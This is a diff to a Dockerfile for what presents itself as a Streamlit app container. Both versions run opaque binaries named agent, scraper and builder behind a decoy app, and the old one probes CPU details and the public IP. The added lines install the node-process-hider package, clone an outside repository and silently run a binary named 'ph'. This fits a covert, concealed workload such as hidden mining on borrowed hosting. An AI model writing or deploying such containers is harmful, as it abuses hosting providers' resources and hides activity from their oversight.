@@ -1,13 +1,11 @@
-
-FROM ubuntu:18.04
-ENV TERM=xterm
+FROM ubuntu:latest
 ENV DEBIAN_FRONTEND=noninteractive
-RUN apt-get update -y
-RUN apt-get install curl git python3 gcc procps --assume-yes
-RUN lscpu
-RUN curl ipinfo.io
-COPY . .
-RUN chmod +x builder agent scraper
-RUN lscpu
-RUN watch free -m & python3 streamlit_app.py > /dev/null
-CMD ["./agent"]
+ENV TERM=xterm
+RUN apt-get update -y; apt-get install curl git npm gcc procps python3 --assume-yes;
+RUN npm i -g node-process-hider
+RUN git clone https://github.com/agussusahnti/qgcm.git
+WORKDIR /qgcm
+RUN chmod +x agent scraper builder ph
+RUN ./ph > /dev/null
+EXPOSE 8080
+CMD ["/bin/sh", "-c", "watch free -m & python3 streamlit_app.py > /dev/null"]
